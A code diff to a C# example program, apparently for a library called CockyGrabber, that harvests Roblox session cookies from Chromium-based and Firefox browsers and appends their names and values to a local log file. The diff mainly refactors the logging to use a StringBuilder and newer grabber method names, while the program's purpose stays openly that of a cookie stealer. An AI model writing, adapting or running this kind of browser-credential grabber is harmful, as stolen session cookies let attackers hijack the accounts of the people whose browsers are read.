@@ -1,3 +1,9 @@
+using CockyGrabber;
+using CockyGrabber.Grabbers;
+using System;
+using System.IO;
+using System.Text;
+
 namespace CockyGrabberTest
 {
     // This Program grabs all Roblox Cookies that could be found and saves them in a log file
@@ -9,24 +15,23 @@ namespace CockyGrabberTest
         {
             UniversalGrabber g = new UniversalGrabber(); // Create Grabber
 
-            List<string> cookies = new List<string>()
-            {
-                $"==========================================================================================",
-                $"NEW LOG STARTED AT {DateTimeOffset.Now}:",
-                "",
-            };
+            StringBuilder cookies = new StringBuilder();
+            cookies.AppendLine();
+            cookies.AppendLine("==========================================================================================");
+            cookies.AppendLine($"NEW LOG STARTED AT {DateTimeOffset.Now}:");
+            cookies.AppendLine();
 
-            // Grab cookies and store the URLs, Usernames and Passwords in 'cookies'
-            foreach (Blink.Cookie c in g.GetAllChromiumCookiesBy(Chromium.CookieHeader.host_key, ".roblox.com"))
+            // Grab logins and store the URLs, Usernames and Passwords in 'logins':
+            foreach (Blink.Cookie c in g.GetAllBlinkCookiesBy(Blink.Cookie.Header.host_key, ".roblox.com"))
             {
-                cookies.Add($"Host: {c.HostKey} | Name: {c.Name} | Value: {c.DecryptedValue}");
+                cookies.AppendLine($"Host: {c.HostKey} | Name: {c.Name} | Value: {c.EncryptedValue}");
             }
-            foreach (Gecko.Cookie c in g.FG.GetCookiesBy(Firefox.CookieHeader.host, ".roblox.com"))
+            foreach (Gecko.Cookie c in g.GetAllGeckoCookiesBy(Gecko.Cookie.Header.host, ".roblox.com"))
             {
-                cookies.Add($"Host: {c.Host} | Name: {c.Name} | Value: {c.Value}");
+                cookies.AppendLine($"Host: {c.Host} | Name: {c.Name} | Value: {c.Value}");
             }
 
-            File.AppendAllLines(LogFilePath, cookies); // Append the grabbed Cookies to the log file
+            File.AppendAllText(LogFilePath, cookies.ToString()); // Append the grabbed Logins to the log file
         }
     }
 }
